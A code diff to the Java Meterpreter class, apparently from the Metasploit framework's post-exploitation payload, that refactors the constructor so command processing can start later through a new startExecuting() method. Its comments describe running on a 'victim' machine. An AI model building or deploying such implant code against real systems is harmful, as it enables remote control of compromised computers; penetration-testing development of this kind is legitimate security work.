@@ -32,12 +32,14 @@ public class Meterpreter {
 
 	private List/* <Channel> */channels = new ArrayList();
 	private final CommandManager commandManager;
+	private final DataInputStream in;
 	private final DataOutputStream out;
 	private final Random rnd = new Random();
 	private final ByteArrayOutputStream errBuffer;
 	private final PrintStream err;
 	private final boolean loadExtensions;
 	private List/* <byte[]> */tlvQueue = null;
+
 
 	/**
 	 * Initialize the meterpreter.
@@ -53,7 +55,27 @@ public class Meterpreter {
 	 * @throws Exception
 	 */
 	public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors) throws Exception {
+		this(in, rawOut, loadExtensions, redirectErrors, true);
+	}
+
+	/**
+	 * Initialize the meterpreter.
+	 * 
+	 * @param in
+	 *            Input stream to read from
+	 * @param rawOut
+	 *            Output stream to write into
+	 * @param loadExtensions
+	 *            Whether to load (as a {@link ClassLoader} would do) the extension jars; disable this if you want to use your debugger's edit-and-continue feature or if you do not want to update the jars after each build
+	 * @param redirectErrors
+	 *            Whether to redirect errors to the internal error buffer; disable this to see the errors on the victim's standard error stream
+	 * @param beginExecution
+	 *            Whether to begin executing immediately
+	 * @throws Exception
+	 */
+	public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors, boolean beginExecution) throws Exception {
 		this.loadExtensions = loadExtensions;
+		this.in = in;
 		this.out = new DataOutputStream(rawOut);
 		commandManager = new CommandManager();
 		channels.add(null); // main communication channel?
@@ -64,6 +86,12 @@ public class Meterpreter {
 			errBuffer = null;
 			err = System.err;
 		}
+		if (beginExecution) {
+			startExecuting();
+		}
+	}
+	
+	public void startExecuting() throws Exception {
 		try {
 			while (true) {
 				int len = in.readInt();
